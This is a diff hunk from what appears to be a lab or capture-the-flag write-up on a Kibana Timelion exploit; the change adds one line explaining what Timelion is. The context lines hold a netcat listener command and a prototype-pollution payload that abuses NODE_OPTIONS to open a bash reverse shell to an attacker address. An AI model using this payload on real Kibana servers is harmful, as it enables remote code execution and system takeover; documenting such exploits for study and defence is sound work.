@@ -119,7 +119,7 @@ On a shell, i run a listenner on port 4444 :
 `nc -lnvp 4444`
 
 On the Timelion, we can use this payload :
-
+*Timelion is a visualization tool for Kibana, he accept expressions with parameters*
 `
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/{MY_IP}/4444 0>&1");process.exit()//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
